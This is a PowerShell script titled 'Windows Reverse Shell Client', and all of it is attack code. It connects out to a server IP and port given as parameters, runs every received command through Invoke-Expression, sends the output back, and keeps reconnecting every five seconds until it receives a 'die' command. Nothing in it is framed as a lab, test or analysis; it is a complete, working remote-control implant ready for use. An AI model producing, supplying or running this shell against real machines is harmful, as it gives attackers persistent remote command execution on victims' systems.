# Windows Reverse Shell Client

param(
    [Parameter(Mandatory=$true, HelpMessage="Server IP address to connect to")]
    [string]$Server,
    
    [Parameter(Mandatory=$true, HelpMessage="Server port to connect to")]
    [int]$Port
)

$Global:ReconnectDelay = 5

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($Server, $Port)
        
        Write-Host "[+] Connected to $Server`:$Port"
        
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        while ($client.Connected) {
            $command = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($command)) { continue }

            Write-Host "[*] Received command: $command"

            if ($command -eq "die") {
                Write-Host "[!] Received kill-session command. Shutting down..."
                $client.Close()
                Exit
            }

            # Execute the command and prepare output
            $tempFile = [System.IO.Path]::GetTempFileName()
            try {
                Invoke-Expression -Command $command | Out-File -FilePath $tempFile -Encoding UTF8
                $output = Get-Content -Path $tempFile -Raw
            } catch {
                $output = "Error executing command: $_"
            } finally {
                if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force }
            }

            # Append EOF marker
            $output += "`nEOF"

            # Send output back to the server
            $writer.WriteLine($output)
            $writer.Flush()
        }
    } catch {
        Write-Host "[-] Connection failed: $_"
    } finally {
        if ($client) { $client.Close() }
        if ($writer) { $writer.Close() }
        if ($reader) { $reader.Close() }
    }

    Write-Host "[*] Reconnecting in $ReconnectDelay seconds..."
    Start-Sleep -Seconds $ReconnectDelay
}
